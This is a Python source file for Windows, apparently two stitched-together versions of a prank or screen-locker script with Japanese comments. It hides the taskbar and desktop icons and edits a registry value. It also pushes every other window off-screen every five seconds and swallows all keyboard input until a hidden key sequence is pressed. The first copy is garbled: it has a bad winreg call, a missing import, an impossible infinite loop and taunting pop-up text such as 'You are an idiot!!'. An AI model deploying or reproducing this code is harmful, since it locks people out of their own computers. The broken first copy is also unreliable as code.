import tkinter as tk
import keyboard
import time
import ctypes
import os
import winreg

# メインウィンドウ（非表示）
root = tk.Tk()
root.withdraw()

# グローバル変数
windows = []
last_minimize_time = 0
just_created = False  # 保護フラグ（未使用だが互換性維持）
delete_pressed = False
delete_time = 0

# デスクトップアイコンを非表示
def hide_desktop_icons():
    try:
        # 方法1: EnumWindowsでSHELLDLL_DefViewを検索
        def enum_windows_proc(hwnd, lParam):
            title_length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
            title = ctypes.create_unicode_buffer(title_length)
            ctypes.windll.user32.GetWindowTextW(hwnd, title, title_length)
            if "SHELLDLL_DefView" in title.value:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                ctypes.windll.user32.UpdateWindow(hwnd)
            return True
        ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)(enum_windows_proc), 0)

        # 方法2: レジストリでHideIconsを設定
        try:
            key = winreg.OpenKey("C:", winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            # エクスプローラーに反映
            ctypes.windll.user32.PostMessageW(ctypes.windll.user32.FindWindowW("Progman", None), 0x111, 0x7402, 0)  # Refresh desktop
        except:
            pass
    except:
        pass

# デスクトップアイコンを復元
def show_desktop_icons():
    try:
        # 方法1: EnumWindowsでSHELLDLL_DefViewを検索
        def enum_windows_proc(hwnd, lParam):
            title_length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
            title = ctypes.create_unicode_buffer(title_length)
            ctypes.windll.user32.GetWindowTextW(hwnd, title, title_length)
            if "SHELLDLL_DefView" in title.value:
                ctypes.windll.user32.ShowWindow(hwnd, 5)  # SW_SHOW
                ctypes.windll.user32.UpdateWindow(hwnd)
            return True
        ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)(enum_windows_proc), 0)

        # 方法2: レジストリでHideIconsをリセット
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            # エクスプローラーに反映
            ctypes.windll.user32.PostMessageW(ctypes.windll.user32.FindWindowW("Progman", None), 0x111, 0x7402, 0)  # Refresh desktop
        except:
            pass
    except:
        pass

# タスクバーを隠す
def hide_taskbar():
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
            ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400)  # RDW_INVALIDATE
    except:
        pass


# タスクバーを復元
def show_taskbar():
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 5)  # SW_SHOW
            ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400)  # RDW_INVALIDATE
    except:
        pass

# 他のウィンドウを画面外に移動（自身のプロセスを除外）
def minimize_other_windows():
    global last_minimize_time, just_created
    current_time = time.time()
    if just_created or (current_time - last_minimize_time < 5.0):  # 5秒クールダウン
        return
    last_minimize_time = current_time
    try:
        own_pid = os.getpid()
        def enum_windows_proc(hwnd, lParam):
            if ctypes.windll.user32.IsWindowVisible(hwnd):
                pid = ctypes.c_ulong()
                ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                if pid.value != own_pid:
                    title_length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
                    title = ctypes.create_unicode_buffer(title_length)
                    ctypes.windll.user32.GetWindowTextW(hwnd, title, title_length)
                    if title.value != "MyAppWindow":
                        ctypes.windll.user32.SetWindowPos(hwnd, None, -9999, -9999, 0, 0, 0x0001)  # SWP_NOSIZE
            return True
        ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)(enum_windows_proc), 0)
    except:
        pass



# cmdウィンドウを画面外に移動
def minimize_terminal():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.SetWindowPos(hwnd, None, -9999, -9999, 0, 0, 0x0001)  # SWP_NOSIZE
    except:
        pass
        
def arrayGacha(array, probs):
    if len(array) != len(probs):
        raise ValueError("長さがあってないっす！先輩、ちゃんとチェックした方がいいっすよ〜？")
    total = sum(probs)
    r = random.uniform(0, total)
    for item, prob in zip(array, probs):
        if r < prob:
            return item
        r -= prob
        
async def 囧():
    list = [
        'You are an idiot!!',
        'WARHAHAHAWARHAHAWARHAWAR',
        '実録小説 サメ！！！！！！！！！！！！！！',
    ]
    len = len(list)
    probs = [1/len for _ in range(len)]
    text = arrayGacha(list, probs)
    
    # tk
    XD = tk.Tk()
    XD.title = text
    
    

def quit_program():
    show_taskbar()
    show_desktop_icons()
    keyboard.unhook_all()
    root.destroy()

def on_key_press(key):
    global delete_pressed, delete_time
    key_name = key.name.lower()
    if key_name == 'delete':
        delete_pressed = True
        delete_time = time.time()
    elif key_name == 'enter' and delete_pressed and (time.time() - delete_time < 2.0):
        root.after(0, quit_program)
        delete_pressed = False
    else:
        delete_pressed = False

def periodic_minimize():
    minimize_other_windows()
    root.after(5000, periodic_minimize)  # 5秒ごとに実行

def main():
    keyboard.add_hotkey('ctrl+shift+s+o', lambda: root.after(0, quit_program))
    keyboard.on_press(on_key_press, suppress=True)
    minimize_terminal()
    time.sleep(1)  # タスクバー隠し遅延
    hide_taskbar()
    hide_desktop_icons()
    minimize_other_windows()
    root.after(5000, periodic_minimize)
    try:
        root.mainloop()
    except:
        pass
    finally:
        show_taskbar()
        show_desktop_icons()
        keyboard.unhook_all()
        root.destroy()

import asyncio
for a in range(int(float("inf"))):
    asynceventroop=asyncio.get_event_loop()
    asynceventroop.run_until_complete(asyncio.gather(囧()))


if __name__ == "__main__":
    try:
        main()
    except:
        show_taskbar()
        show_desktop_icons()
        keyboard.unhook_all()
        root.destroy()import tkinter as tk
import keyboard
import time
import ctypes
import os
import winreg

# メインウィンドウ（非表示）
root = tk.Tk()
root.withdraw()

# グローバル変数
windows = []
last_minimize_time = 0
just_created = False  # 保護フラグ（未使用だが互換性維持）
delete_pressed = False
delete_time = 0

# デスクトップアイコンを非表示
def hide_desktop_icons():
    try:
        # 方法1: EnumWindowsでSHELLDLL_DefViewを検索
        def enum_windows_proc(hwnd, lParam):
            title_length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
            title = ctypes.create_unicode_buffer(title_length)
            ctypes.windll.user32.GetWindowTextW(hwnd, title, title_length)
            if "SHELLDLL_DefView" in title.value:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                ctypes.windll.user32.UpdateWindow(hwnd)
            return True
        ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)(enum_windows_proc), 0)

        # 方法2: レジストリでHideIconsを設定
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            # デスクトップ更新
            ctypes.windll.shell32.SHChangeNotify(0x08000000, 0, None, None)  # SHCNE_ASSOCCHANGED
        except:
            pass

        # 方法3: SystemParametersInfoでフォールバック
        try:
            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 2)  # SPI_SETDESKTOPWALLPAPER, update
        except:
            pass
    except:
        pass

# デスクトップアイコンを復元
def show_desktop_icons():
    try:
        # 方法1: EnumWindowsでSHELLDLL_DefViewを検索
        def enum_windows_proc(hwnd, lParam):
            title_length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
            title = ctypes.create_unicode_buffer(title_length)
            ctypes.windll.user32.GetWindowTextW(hwnd, title, title_length)
            if "SHELLDLL_DefView" in title.value:
                ctypes.windll.user32.ShowWindow(hwnd, 5)  # SW_SHOW
                ctypes.windll.user32.UpdateWindow(hwnd)
            return True
        ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)(enum_windows_proc), 0)

        # 方法2: レジストリでHideIconsをリセット
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "HideIcons", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            # デスクトップ更新
            ctypes.windll.shell32.SHChangeNotify(0x08000000, 0, None, None)  # SHCNE_ASSOCCHANGED
        except:
            pass

        # 方法3: SystemParametersInfoでフォールバック
        try:
            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 2)  # SPI_SETDESKTOPWALLPAPER, update
        except:
            pass
    except:
        pass

# タスクバーを隠す
def hide_taskbar():
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
            ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400)  # RDW_INVALIDATE
    except:
        pass

# タスクバーを復元
def show_taskbar():
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 5)  # SW_SHOW
            ctypes.windll.user32.RedrawWindow(hwnd, None, None, 0x0400)  # RDW_INVALIDATE
    except:
        pass

# 他のウィンドウを画面外に移動（自身のプロセスを除外）
def minimize_other_windows():
    global last_minimize_time, just_created
    current_time = time.time()
    if just_created or (current_time - last_minimize_time < 5.0):  # 5秒クールダウン
        return
    last_minimize_time = current_time
    try:
        own_pid = os.getpid()
        def enum_windows_proc(hwnd, lParam):
            if ctypes.windll.user32.IsWindowVisible(hwnd):
                pid = ctypes.c_ulong()
                ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                if pid.value != own_pid:
                    title_length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
                    title = ctypes.create_unicode_buffer(title_length)
                    ctypes.windll.user32.GetWindowTextW(hwnd, title, title_length)
                    if title.value != "MyAppWindow":
                        ctypes.windll.user32.SetWindowPos(hwnd, None, -9999, -9999, 0, 0, 0x0001)  # SWP_NOSIZE
            return True
        ctypes.windll.user32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)(enum_windows_proc), 0)
    except:
        pass

# cmdウィンドウを画面外に移動
def minimize_terminal():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.SetWindowPos(hwnd, None, -9999, -9999, 0, 0, 0x0001)  # SWP_NOSIZE
    except:
        pass

def quit_program():
    show_taskbar()
    show_desktop_icons()
    keyboard.unhook_all()
    root.destroy()

def on_key_press(key):
    global delete_pressed, delete_time
    key_name = key.name.lower()
    if key_name == 'delete':
        delete_pressed = True
        delete_time = time.time()
    elif key_name == 'enter' and delete_pressed and (time.time() - delete_time < 2.0):
        root.after(0, quit_program)
        delete_pressed = False
    else:
        delete_pressed = False

def periodic_minimize():
    minimize_other_windows()
    root.after(5000, periodic_minimize)  # 5秒ごとに実行

def main():
    keyboard.add_hotkey('ctrl+shift+s+o', lambda: root.after(0, quit_program))
    keyboard.on_press(on_key_press, suppress=True)
    minimize_terminal()
    time.sleep(1)  # タスクバー隠し遅延
    hide_taskbar()
    hide_desktop_icons()
    minimize_other_windows()
    root.after(5000, periodic_minimize)
    try:
        root.mainloop()
    except:
        pass
    finally:
        show_taskbar()
        show_desktop_icons()
        keyboard.unhook_all()
        root.destroy()

if __name__ == "__main__":
    try:
        main()
    except:
        show_taskbar()
        show_desktop_icons()
        keyboard.unhook_all()
        root.destroy()